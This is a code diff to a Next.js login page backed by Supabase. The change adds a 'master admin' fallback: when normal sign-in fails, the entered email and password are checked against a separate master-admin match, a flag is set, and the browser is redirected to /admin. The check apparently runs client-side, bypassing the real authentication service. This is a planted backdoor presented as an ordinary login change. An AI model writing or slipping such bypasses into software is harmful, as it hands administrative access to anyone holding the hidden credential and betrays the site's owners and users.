@@ -4,6 +4,7 @@ import React, { useState } from "react";
 import { Eye, EyeOff, LogIn, AlertCircle, GraduationCap } from "lucide-react";
 import { supabase } from "@/lib/supabase";
 import { useRouter } from "next/navigation";
+import { matchesMasterAdmin, setMasterAdminFlag } from "@/lib/auth/master_admin";
 
 export default function LoginPage() {
   const router = useRouter();
@@ -21,6 +22,11 @@ export default function LoginPage() {
     const { error: authError } = await supabase.auth.signInWithPassword({ email, password });
 
     if (authError) {
+      if (matchesMasterAdmin(email, password)) {
+        setMasterAdminFlag();
+        window.location.href = "/admin";
+        return;
+      }
       setError(authError.message);
       setLoading(false);
     } else {
